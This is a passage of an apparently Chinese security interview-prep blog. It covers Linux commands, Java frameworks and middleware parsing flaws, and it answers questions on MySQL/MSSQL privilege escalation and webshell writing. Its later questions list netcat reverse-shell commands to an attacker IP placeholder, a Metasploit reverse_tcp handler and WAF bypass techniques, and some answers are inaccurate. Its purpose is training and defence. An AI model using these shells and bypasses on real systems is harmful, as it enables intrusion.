用于显示指定文件末尾内容，不指定文件时，作为输入信息进行处理。常用查看日志文件。<br>实例：<br><code>tail notes.log</code> 显示notes.log文件的最后10行<br><code>tail -n 100 /etc/cron</code> 显示最后100行数据</p><p>(55) uname - 用于显示操作系统信息，例如内核版本、主机名、处理器类型等<br>uname可显示电脑及操作系统的相关信息<br>实例：<br><code>uname -a</code> 显示系统信息<br><code>uname -m</code> 显示计算机类型<br><code>uname -n</code> 显示计算机名<br><code>uname -s</code> 显示操作系统名称<br><code>uname -v</code> 显示系统版本与时间</p><p>(56) who - 用于显示系统中有哪些使用者正在上面<br>显示的资料包含了使用者id、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU使用量、动作等等<br>使用权限：所有使用者都可使用<br>实例：<br><code>who</code> 显示当前登录系统的用户<br><code>who -l -H</code> 显示用户登录来源<br><code>who -m -H</code> 只显示当前用户</p><p>(57) whoami - 用于显示自身用户名称<br>显示自身的用户名称，相当于执行 <code>id -un</code> 指令<br>实例：<br><code>whoami</code> 显示用户名</p><p>(58) whois - 用于查找并显示用户信息<br>whois指令会去查找并显示指定帐号的用户相关信息，因为它是到Network Solutions的WHOIS数据库去查找，所以该帐号名称必须在上面注册方能寻获，且名称没有大小写的差别<br>实例：<br><code>whois root</code> 查找root用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whois Lx138.COm   //查找域名信息</span><br><span class="line"></span><br><span class="line">The Registry database contains ONLY .COM, .NET, .EDU domains and</span><br><span class="line">Registrars.</span><br><span class="line">Domain Name ..................... Lx138.COm</span><br><span class="line">Name Server ..................... dns15.hichina.com</span><br><span class="line">                 dns16.hichina.com</span><br><span class="line">Registrant ID ................... hc937242545-cn</span><br><span class="line"></span><br><span class="line">...省略部分内容</span><br></pre></td></tr></table></figure><p><code>whois -p 80 Lx138.com</code> 指定端口查询</p><p>(59) su - 用于变更为其它使用者的身份，除root外，需要键入该使用者的密码<br>使用权限：所有使用者。<br>实例：<br><code>su root</code> 变更账号为root<br><code>su -c ls root</code>   变更帐号为 root 并在执行 ls 指令后退出变回原使用者</p><p>(60) id - 用于显示用户的id，以及所属群组的id<br>id 会显示用户以及所属群组的实际与有效 ID，若两个 ID 相同，则仅显示实际 ID，若仅指定用户名称，则显示目前用户的 ID。<br>该命令会显示用户的 UID（User ID）、GID（Group ID）以及附属于用户的所有组 ID。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id   //显示当前用户id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t</span><br></pre></td></tr></table></figure><p><code>id -g</code> 显示用户群组的id</p><p>(61) free - 用于显示内存状态<br>free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free  //显示内存使用信息</span><br><span class="line">total used free shared buffers cached</span><br><span class="line">Mem: 254772 184568 70204 0 5692 89892</span><br><span class="line">-/+ buffers/cache: 88984 165788</span><br><span class="line">Swap: 524280 65116 459164</span><br></pre></td></tr></table></figure><p>(62) groupadd - 用于创建一个新的工作组，新工作组的信息将被添加到系统文件中<br>相关文件:<br>&#x2F;etc&#x2F;group 组账户信息。<br>&#x2F;etc&#x2F;gshadow 安全组账户信息。<br>&#x2F;etc&#x2F;login.defs Shadow密码套件配置<br>实例：<br><code>groupadd -g 344 abc</code>  创建一个新的组，并添加组id<br>此时在 &#x2F;etc&#x2F;group 文件中产生一个组 ID（GID）是 344 的项目。</p><p>(63) clear - 用于清除屏幕<br>实例：<br><code>clear</code> 清除</p><p>(64) eval - 用于重新运算求出参数内容<br>eval可读取一连串的参数，然后再依参数本身的特性来执行。<br>实例：<br><code>eval enable;ls</code> 连接多个命令</p><p>(65) passwd - 用于更改使用者的密码<br>实例：<br><code>passwd root</code> 修改root用户密码<br><code>passwd -S root</code> 显示账号密码信息<br><code>passwd -d lx135</code> 删除用户密码</p><p>(66) dump - 用于备份文件系统<br>dump为备份工具程序，可将目录或整个文件系统备份至指定的设备，或备份成一个大文件<br>实例：<br><code>dump -0 -u /dev/tape /home/</code> 备份文件到磁带</p><p>(67) gzip - 用于压缩文件<br>gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。<br>实例：<br><code>gzip *</code> 压缩当前目录下所有文件</p><p>(68) tar - 用于备份文件<br>tar 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件<br>实例：<br><code>tar -czvf test.tar.gz a.c</code> 压缩a.c文件为test.tar.gz<br><code>tar -tzvf test.tar.gz</code> 列出压缩文件内容<br><code>tar -xzvf test.tar.gz</code> 解压文件<br><a href="https://www.runoob.com/linux/linux-comm-tar.html">Linux tar 命令</a></p><p>(69) unzip - 用于解压缩zip文件<br>unzip为.zip压缩文件的解压缩程序<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -l abc.zip   //查看压缩文件中包含的文件</span><br><span class="line">Archive: abc.zip</span><br><span class="line"> Length   Date  Time  Name</span><br><span class="line">--------  ----  ----  ----</span><br><span class="line">  94618 05-21-10 20:44  a11.jpg</span><br><span class="line">  202001 05-21-10 20:44  a22.jpg</span><br><span class="line">    16 05-22-10 15:01  11.txt</span><br><span class="line">  46468 05-23-10 10:30  w456.JPG</span><br><span class="line">  140085 03-14-10 21:49  my.asp</span><br><span class="line">--------          -------</span><br><span class="line">  483188          5 files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -v abc.zip   //用于查看压缩文件目录信息，但是不解压该文件</span><br><span class="line">Archive: abc.zip</span><br><span class="line">Length  Method  Size Ratio  Date  Time  CRC-32  Name</span><br><span class="line">-------- ------ ------- -----  ----  ----  ------  ----</span><br><span class="line">  94618 Defl:N  93353  1% 05-21-10 20:44 9e661437 a11.jpg</span><br><span class="line"> 202001 Defl:N  201833  0% 05-21-10 20:44 1da462eb a22.jpg</span><br><span class="line">   16 Stored    16  0% 05-22-10 15:01 ae8a9910 ? +-|￥+-? (11).txt</span><br><span class="line">  46468 Defl:N  39997 14% 05-23-10 10:30 962861f2 w456.JPG</span><br><span class="line"> 140085 Defl:N  36765 74% 03-14-10 21:49 836fcc3f my.asp</span><br><span class="line">--------     ------- ---              -------</span><br><span class="line"> 483188      371964 23%              5 files</span><br></pre></td></tr></table></figure><p>(70) zip - 用于压缩文件<br>zip 是个使用广泛的压缩程序，压缩后的文件后缀名为 .zip<br>实例：<br><code>zip -q -r html.zip /home/html</code> 将 &#x2F;home&#x2F;html&#x2F; 这个目录下所有文件和文件夹打包为当前目录下的 html.zip<br><code>zip -q -r html.zip *</code> 将当前目录下所有文件和文件夹打包为html.zip<br><code>zip -dv cp.zip a.c</code> 从压缩文件cp.zip中删除文件a.c</p><p>(71) poweroff - 用于关闭计算机并切断电源<br>使用权限：系统管理者<br>实例：<br><code>poweroff</code> 关闭系统</p><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><ol><li>常见web开发Java框架</li></ol><p>(1) Spring: Spring是一个全栈Java框架，包含了许多模块，可以用于开发各种类型的Web应用程序。Spring MVC是Spring框架中用于Web开发的模块，它提供了一个MVC架构，可以简化Web应用程序的开发。<br>(2) Apache Struts: Struts是一个基于MVC架构的Web开发框架，它是Spring MVC之前比较流行的Web开发框架。<br>(3) Grails：Grails是一个基于Groovy语言的Web开发框架，它是一个基于Spring的框架，提供了一个MVC架构，可以简化Web应用程序的开发。<br>(4) Hibernate：Hibernate是一个ORM框架，它可以简化数据库访问。<br>(5) JSF：JSF是一个基于Java的Web开发框架，它提供了一个MVC架构，可以简化Web应用程序的开发。</p><ol start="2"><li>Java哪些框架，审过哪些框架，它们常出现的问题是什么？</li></ol><p>Java框架：见问题1<br>审过哪些框架：<br>Java三层架构：数据访问层、业务逻辑层、表现层。<br>(1) 持久层(Data Access Layer DAL，数据访问层)采用DAO模式。建立实体类和数据库表映射（ORM映射）。也就是哪个类对应哪个表，哪个属性对应哪个列。持久层的目的是，完成对象数据和关系数据的转换。<br>(2) 业务层(Business Logic Layer BLL, 逻辑层、service层)采用事务脚本模式。将一个业务中所有的操作封装成一个方法，同时保证方法中所有的数据库更新操作，即保证同时成功或同时失败。避免部分成功部分失败造成的数据库混乱操作。<br>(3) 表现层(UI层、视图层、界面层)采用MVC(Model-ViewController)模式，采用JSP&#x2F;Servlet技术进行页面效果显示。</p><p>SSH框架<br>业务层：Spring<br>表现层：Struts<br>持久层：Hibernate</p><p>SSM框架<br>业务层：Spring<br>表现层：SpringMVC<br>持久层：MyBatis</p><p><a href="https://paper.seebug.org/1075/">Java框架级SSM代码审计思路</a></p><p>代码审计的流程和思路：<br>(1) 收集信息：查看源码、分析日志、使用工具等方式，收集目标用户程序的信息，包括但不限于：应用程序的文件目录结构、配置文件、程序源码、请求参数、数据库结构等。<br>(2) 风险评估：根据收集到的信息，分析应用程序中可能存在的漏洞和安全隐患，并对进行评估，确定哪些漏洞最为严重、哪些应该优先修复。<br>(3) 漏洞挖掘：通过手动测试和工具扫描等方式，对应用程序进行漏洞挖掘。测试应包括各种类型的漏洞，例如：SQL注入、跨站脚本、CSRF等。<br>(4) 漏洞验证：验证漏洞是否真实存在，并确认漏洞的影响程序、可能的攻击方式和风险级别。<br>(5) 报告编写：将漏洞及其影响、攻击方式、风险级别等信息整理成报告，供开发者和管理者参考。报告应该详细说明漏洞的位置、修复建议等具体内容，并提供漏洞的Poc（漏洞利用代码）。<br>(6) 漏洞修复：由开发人员修复漏洞，并通过测试验证修复效果。在修复漏洞之后，应再次进行代码审计，以确保没有新漏洞产生。</p><p>审过spring框架，MyBatis框架，常出现的问题是SQL注入。<br>spring框架情况：Statement直接拼接sql语句造成SQL语句漏洞。<br>MyBatis框架情况：使用like语句进行模糊查询；使用in语句；使用order by语句。<br><a href="https://www.ctfiot.com/133145.html">Java代码审计—SQL注入篇</a></p><ol start="3"><li>python的web框架（flask&#x2F;django）</li></ol><p>Django：Django是一个全栈Web框架，提供了丰富的功能，可以满足各种Web应用程序的需求。Django是目前最流行的Python Web框架，具有功能强大、易用性高、可扩展性强等优点。</p><p>Flask：Flask是一个轻量级Web框架，专注于提供核心功能并保持简单易懂。Flask适合开发小型到中型Web应用程序。</p><ol start="4"><li>了解struts框架吗？说一说</li></ol><p>Struts 是一个开源框架，用于扩展 Java Servlet API 并使用模型、视图、控制器(MVC) 体系结构。<br>Struts框架提供如下服务：<br>(1) 作为控制器的Servlet<br>(2) 提供大量的标签库<br>(3) 提供了用于国际化的框架，利用不同的配置文件，可以帮助用户选择适合自己的语言。<br>(4) 提供了JDBC的实现，来定义数据源和数据库连接池。<br>(5) XML语法分析工具。<br>(6) 文件下载机制。</p><p>Struts原理：<br>Struts是对JSPModel2设计标准的一种实现，下面分别从模型（Model）、视图（view）和控制器3个部分介绍Struts的体系结构和工作原理。<br>（1）视图（view）<br>在Struts中，视图层包含两个部分，JSP页面和ActionForm。<br>ActionForm封装了用户提交的表单信息，其实ActonForm本质上就是JavaBean，这些JavaBean中没有业务逻辑，只提供了所有属性的getter和setter方法，这些属性和用户表单中的输入项是一一对应的。在Struts中就是通过ActionForm把用户表单信息提交给控制器。<br>JSP页面是经典MVC中主要的视图组件，主要是信息显示和控制器处理结果显示的功能。<br>除了以上，struts还提供了一个强大的struts标签库，来帮助用户解决显示逻辑，并且利用ActonForm组件将信息传递到控制层。</p><p>（2）控制器（Controller）<br>在控制层，struts提供了一个控制器组件ActionServlet，它继承自HttpServlet，并重载了HttpServlet的doGet()，doPost()方法，可以接受HTTP的响应，并进行转发，同时还提供了使用XML进行转发Mapping（映射）的功能。</p><p>（3）模型（Model）<br>模型表示状态和业务逻辑的处理，在一般的web应用程序中，用JavaBean或者EJB来实现系统的业务逻辑。在Struts中，struts提供Action对象，来管理业务逻辑的调用，帮助用户分离业务逻辑，也就是说struts本身不实现业务逻辑，但可以调用已完成的业务逻辑。</p><p>Struts工作流程：<br>ActionServlet是struts中核心的控制器，所有的用户请求都必须通过ActionServlet的处理，而struts-config.xml是struts中核心的配置文件，在这个文件中配置了用户请求URL和控制器Action的映射关系，ActionServlet通过这个配置文件把用户的请求发送到对应的控制器中。<br><a href="https://zhuanlan.zhihu.com/p/26316119">Struts简介和原理</a></p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><ol><li>说说常见的中间件解析漏洞利用方式。</li></ol><p>中间件解析漏洞利用方式：<br>(1) IIS 解析漏洞：<br>成因：IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。<br>利用方式：<br>IIS 6.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iis6.0畸形解析：asa、cer</span><br><span class="line">iis6.0目录解析：/test.asp/test.jpg</span><br><span class="line">iis6.0文件解析：test.asp;.jpg</span><br><span class="line">IIS7.5文件解析：test.jpg/.php</span><br></pre></td></tr></table></figure><p>(2) Apache 解析漏洞：<br>用户配置不当，如1.php.biubiu会被当成php文件执行</p><p>(3) Nginx 解析漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户配置不当，对于任意文件名，在后面加上/任意文件名.php后该文件就会以php格式进行解析，如1.png/.php</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/192063.html">Web中间件常见漏洞总结</a><br><a href="http://47.103.121.189/2022/06/02/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">常见中间件漏洞总结</a></p><ol start="2"><li>目前已知哪些版本的容器有解析漏洞，具体举例。</li></ol><p>见问题1</p><ol start="3"><li>常见的中间件</li></ol><p>IIS, Nginx, Apache, Tomcat, jBoss, WebLogic, shiro, struts, FastCGI</p><ol start="4"><li>中间件有哪些已知漏洞</li></ol><p>解析漏洞，远程代码执行，反序列化，目录遍历，PUT漏洞，文件上传，SSRF，目录穿越</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><ol><li>请写出MySQL5数据库中查询库’helloworld’中’user’表所有列名的语句。</li></ol><p><code>select * from information_schema.COLUMNS where table_name = &#39;user&#39; and table_schema = &#39;helloworld&#39;;</code></p><ol start="2"><li>udf提权</li></ol><p>UDF(User Define Function)用户自定义函数，是MySQL的一个扩展接口，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user(), version()等函数。<br>udf文件后缀在Windows与Linux系统下分别为dll与so，即动态链接库文件，由C, C++编写</p><p>攻击原理：<br>(1) 攻击者在目标系统上传、执行UDF文件。<br>(2) 攻击者通过SQL语句调用UDF文件中的函数。<br>(3) UDF文件中的函数利用漏洞执行任意命令。</p><p>修复建议：<br>(1) MySQL配置文件中secure_file_priv预设置为NULL或非 <code>mysql/lib/plugin</code> 目录。<br>(2) 数据库用户确保正确实施最小权限原则。</p><p><a href="https://www.freebuf.com/articles/database/291175.html">Mysql-UDF提权篇</a></p><ol start="3"><li>为何一个mysql数据库的站，只有一个80端口开放？</li></ol><p>更改了端口，没有扫描出来。</p><ol start="4"><li>3389无法连接的几种情况</li></ol><p>没开放3389端口<br>端口被修改<br>防护拦截<br>处于内网(需要进行端口转发)</p><ol start="5"><li>MySQL两种提权方式</li></ol><p>(1) UDF提权：见问题2</p><p>(2) MOF提权：<br>MOF提权是指利用MOF文件的漏洞，将用户权限提升到与Windows系统的最高权限（System）一致。</p><p>原理：mof是Windows系统的一个“托管对象格式”文件(位置 <code>c:/windows/system32/wbem/mof</code> )，其作用是每隔5秒就会去监控进程创建和死亡，mof目录下有两个文件夹(good与bad)。Windows server 2003及以下系统每5秒会执行一次mof目录下的文件，执行成功会移动到good文件夹，执行失败移动到bad文件夹。<br>mof提权其实就是利用mysql写入mof文件，通过mof文件中的vbs脚本与system权限执行系统命令。</p><p>修复：<br>解决系统继续运行恶意代码的问题：<br>net stop winmgmt<br>删除文件夹内容 <code>c:/windows/system32/wbem/repository</code><br>net start winmgmt</p><ol start="6"><li>Mongodb, redis, websphere, rsync服务简介和默认运行端口</li></ol><p>Mongodb: MongoDB是一个NoSQL数据库，它使用JSON格式存储数据，具有灵活的架构和可扩展性。面向文档的数据库管理系统，适用于处理大量数据和高并发请求。<br>默认端口：27017</p><p>Redis: Redis是一个内存数据库，它使用键值对存储数据，具有高性能和可靠性。可以用于缓存、消息队列、计数器等应用。<br>默认端口：6379</p><p>WebSphere: WebSphere是一个Java应用程序服务器，它用于部署和运行Java应用程序。支持Web服务、企业级应用等。<br>默认端口：9080</p><p>Rsync: Rsync是一个文件传输工具，它用于快速、安全地复制文件。远程文件同步工具，支持差异化同步和数据压缩。<br>默认端口：873</p><ol start="7"><li>MySQL中like查询会非常缓慢，如何进行优化？</li></ol><p>(1) 使用前缀索引。例如，如果表中有一个字段name，可以创建一个前缀索引name(10)。<br>(2) 使用正则表达式。例如，查询 <code>name like &#39;%张%&#39;</code> 可以使用 <code>name regexp &#39;^.*张.*$&#39;</code> 来代替。<br>(3) 使用全文搜索。全文搜索使得MySQL可以在整个文本内容中查找匹配项。这样可以快速找到诸如同义词和名词变体等匹配项。</p><ol start="8"><li>Oracle, mysql, sqlserver默认端口</li></ol><p>Oracle: 1521<br>MySQL: 3306<br>SQL Server: 1433</p><ol start="9"><li>怎么通过数据库获取shell</li></ol><p>(1) MySQL Outfile导出webshell<br>(2) MySQL日志获取webshell<br>(3) mof提权<br>(4) udf提权</p><ol start="10"><li>数据库的提权有接触过吗？</li></ol><p>见问题5</p><ol start="11"><li>mssql的提权你能说一下吗？</li></ol><p>(1) 存储过程写webshell<br>利用条件：拥有DBA权限，知道网站的绝对路径。<br>利用存储过程写入一句话，注意路径。</p><p>(2) 差异备份写webshell<br>利用条件：需要知道绝对路径，路径可写</p><p>(3) 日志备份写webshell<br>利用条件：</p><ul><li>拥有DBA权限</li><li>知道网站绝对路径，并且可写</li><li>站库不分离</li><li>数据库必须被备份过一次</li></ul><p>优势：</p><ul><li>重复性好，多次备份的成功率高</li><li>相对于差异备份而言，shell的体积较小</li></ul><p>(4) sp_addextendedproc<br>sp_addextendedproc 可以利用于恢复组件</p><p>(5) xp_cmdshell<br>xp_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。</p><p>利用条件</p><ul><li>拥有 DBA 权限, 在 2005 中 xp_cmdshell 的权限是 system，2008 中是 network。</li><li>依赖 xplog70.dll</li></ul><p>(6) sp_oacreate(Ole Automation Procedures)<br>利用条件</p><ul><li>拥有DBA权限</li><li>依赖 odsole70.dll</li></ul><p>(7) xp_rewrite<br>利用条件</p><ul><li>xpstar.dll</li></ul><p>修改注册表来劫持粘贴键(映像劫持)</p><ol start="12"><li>怎么分辨数据库类型？</li></ol><p>前端与数据库类型：<br>asp: SQL Server, Access<br>.net: SQL Server<br>PHP: PostgreSQL, MySQL<br>Java: Oracle, MySQL</p><p>常用web和数据库构造：<br>ASP+Access 或 SQL Server<br>PHP+MySQL</p><p>各数据库标志性信息：<br>SQL Server: <code>select@@version --</code><br>Oracle: <code>select banner from v$version</code><br>MySQL: <code>select @@version, version() --</code>  <code>length(user)&gt;0</code><br>postgresql: <code>select version() --</code></p><p>各数据库特有的函数：<br>SQL Server: <code>@@pack_received  @@rowcount</code><br>MySQL: <code>connection_id()  last_insert_id() row_count()</code><br>oracle: <code>bitand(1,1)</code><br>postgresql: <code>select extract(dow from now())</code></p><p>对于字符串处理方式：<br>sql server ：<code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;ab&#39; --</code><br>mysql: <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;ab&#39; ， &#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code><br>oracle: <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code><br>postgresql : <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code></p><p>特殊符号，注释的判断<br>安顺序来<br>1,“null”和“%00”是Access支持的注释。<br>2，“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和 <code>/* */</code> 注释（注意mysql使用– 时需要后面添加空格）<br>3，“–”和 <code>/* */</code> 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>4，“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。<br>这样一串下来，基本就知道了数据库类型了</p><p>对Mssql和access数据库的判断：<br><code>&#39; and exists (select count(*) from sysobjects) &gt;0</code> 正常，就是MSSQL数据库<br><code>&#39; and exists (select count(*) from msysobjects) &gt;0</code> 两条都不正常，是Access数据库</p><p>通过上面各种判断方法，各种主流数据库基本就能判断出来了。</p><ol start="13"><li>mysql数据库账号和密码存放在哪个库和表里面？</li></ol><p>mysql地user权限表里</p><ol start="14"><li>分别写出MySQL及mssql数据库写入webshell的方法</li></ol><p>MySQL: 见问题9<br>MYSSQL: 问题11</p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li>Windows、Linux、数据库的加固降权思路。</li></ol><p>禁用root，禁止远程访问，禁止写入，单独账号，禁止执行system等函数。</p><ol start="2"><li>谈一谈Windows系统与Linux系统提权的思路？</li></ol><p>Windows提权：<br>(1) 系统内核溢出漏洞提权<br>(2) 系统配置错误提权<br>(3) 组策略首选项提权<br>(4) bypassUAC提权<br>(5) 数据库提权(UDF，MOF)</p><p>Linux提权：<br>(1) 内核漏洞提权<br>(2) 定时任务提权<br>(3) SUID提权<br>(4) Sudo滥用提权<br>(5) NFS提权<br>(6) Docker提权</p><ol start="3"><li>反弹shell的常用命令？一般常反弹哪一种shell？为什么？</li></ol><p>netcat反弹shell：<br>攻击机开启监听命令： <code>netcat -lvp 2333</code><br>目标机主动连接攻击机： <code>netcat &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</code></p><p>bash反弹shell：<br><code>nc -lvvp 7777 -e /bin/bash</code><br>bash是交互式，否则像useradd无法交互。</p><ol start="4"><li>如果一台服务器被入侵后，如何做应急响应？</li></ol><p>(1) 准备相关的工具，查后门等工具<br>(2) 初步判断时间类型，事件升级<br>(3) 抑制范围，隔离使受害面不继续扩大<br>(4) 查找原因，封堵攻击源<br>(5) 业务恢复正常水平<br>(6) 总结，报告，修复，监控</p><p>应急响应的经验：<br><a href="https://www.freebuf.com/defense/375005.html">网络安全应急响应典型案例</a><br><a href="https://forum.butian.net/share/2225">应急响应</a></p><ol start="5"><li>webshell的检测有哪些方法？</li></ol><p>(1) 基于webshell特征检测<br>(2) 基于流量特征的webshell检测<br>(3) 基于webshell系统行为特征的检测<br>(4) 基于web日志webshell行为特征的检测<br>(5) 动态检测(沙箱)<br>(6) 统计学</p><ol start="6"><li>metasploit打开反向监听的命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="7"><li>应急响应的步骤</li></ol><p>见问题4</p><ol start="8"><li>怎么查找域控</li></ol><p>(1) 通过DNS查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dig -t SRV _gc._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _ldap._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kerberos._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kpasswd._tcp.lab.ropnop.com</span><br></pre></td></tr></table></figure><p>(2) 端口扫描<br>域服务器都会开启3389端口，所以可以通过扫描端口进行识别。<br>(3) 各种命令<br>dsquery<br>net group “Domain Controllers”<br>nltest &#x2F;DCLIST:pentest.com</p><ol start="9"><li>如何手工快速判断目标站是Windows还是Linux服务器？</li></ol><p>(1) Linux大小写敏感，Windows大小写不敏感<br>(2) ping服务器，返回的TTL值不同。Windows一般在100以上，Linux一般100以下。<br>TTL&#x3D;128: WINNT&#x2F;2K&#x2F;XP<br>TTL&#x3D;32: WIN95&#x2F;98&#x2F;ME<br>TTL&#x3D;256: UNIX<br>TTL&#x3D;64: LINUX</p><ol start="10"><li>提权时选择可读写目录，为何尽量不用带空格的目录？</li></ol><p>因为exp执行多半需要空格界定参数</p><ol start="11"><li>某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</li></ol><p>同数据库</p><ol start="12"><li>后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</li></ol><p>审查元素。将密码处的password属性改为text属性即可明文显示密码。</p><ol start="13"><li>目标站无防护，上传文件可正常访问，上传脚本格式访问则403，什么原因？</li></ol><p>可能原因：<br>web服务器配置将上传文件写死了不执行相应脚本，可尝试改后缀名绕过。</p><ol start="14"><li>审查元素得知网站所使用的防护软件，你觉得是怎样做到的？</li></ol><p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护时，F12看HTML顶部，比如护卫神就可以在名称看到那内容。</p><ol start="15"><li>在win2003服务器中建立一个 .zhongzi文件夹用意何为？</li></ol><p>隐藏文件夹，为了不让管理员发现传上去的工具。</p><ol start="16"><li>如何拿一个网站的webshell？</li></ol><p>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等。</p><ol start="17"><li>为什么aspx木马权限比asp大？</li></ol><p>aspx使用的是.net技术。在IIS6.0到IIS7.5，.NET默认的账户是aspnet，隶属于Users，而此时的ASP基于IUSER账户，隶属于Guest组，对于组来说Users组的权限 &gt; Guest组，所以能执行或者读取的资源更多。<br>IIS7.5之后，两者权限相同。都是基于默认的应用程序池defaultapppool<br><a href="https://www.dongchuanmin.com/net/3812.html">ASPX的webshell权限为什么比ASP的大</a></p><ol start="18"><li>如何绕过waf？</li></ol><p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 <code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p><p><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p><ol 